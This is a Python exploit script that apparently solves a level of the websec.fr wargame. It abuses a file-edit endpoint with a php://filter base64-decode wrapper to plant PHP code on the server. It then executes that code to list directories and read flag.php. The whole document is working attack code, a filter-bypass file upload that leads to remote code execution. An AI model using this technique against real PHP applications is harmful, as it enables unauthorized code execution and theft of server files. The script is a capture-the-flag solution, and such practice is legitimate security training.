import requests
import base64

cookie = {'PHPSESSID':PHPSESSID}
ls = "<?php $path = \"../../\"; $entrys = array(); $dirs = dir($path); while(false !== ($entry = $dirs->read())){$entrys[] =$entry; } $dirs->close(); var_export($entrys);?>".encode("utf-8")
flag = "<?php echo file_get_contents('../../flag.php');?>".encode("utf-8")
Flag = []

def File_Upload(Filename, PHP_CODE):
	URL = "http://websec.fr/level24/index.php?p=edit&filename={}".format(Filename)
	data = {'data':PHP_CODE}
	res = requests.post(URL, cookies=cookie,data=data)
	print("[+] File Upload Success : {}".format(Filename))

def File_Ex(Filename):
	URL = "http://websec.fr/level24/uploads/hh00p9b5u12609qdl4gusj7rkmlkfcts/" + Filename
	res = requests.get(URL, cookies=cookie)
	return res.text

if __name__ == '__main__':
	print("[+] Start")
	File_Upload("php://filter/convert.base64-decode/resource=ls.php", base64.b64encode(ls).decode("utf-8"))
	print("[+] Directory : " + File_Ex("ls.php"))
	File_Upload("php://filter/convert.base64-decode/resource=FLAG.php", base64.b64encode(flag).decode("utf-8"))
	flag = File_Ex("FLAG.php")
	Flag = flag.split("//")
	print("[+]Find Flag : {}".format(Flag[1]))